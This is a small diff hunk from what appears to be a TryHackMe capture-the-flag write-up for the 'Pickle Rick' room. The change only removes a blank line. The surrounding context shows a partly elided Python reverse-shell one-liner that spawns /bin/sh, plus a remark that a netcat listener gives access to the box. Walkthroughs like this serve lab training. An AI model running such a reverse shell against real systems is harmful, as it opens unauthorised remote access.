@@ -25,7 +25,6 @@ tags: TryHackMe
 	 	python -c 'import ......os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 	 ```
 
-
  - listening via netcat will gain you access to the **BOX**
 ### 1st Flag:
 ![user_flag](/images/pickleRick/1st.png)
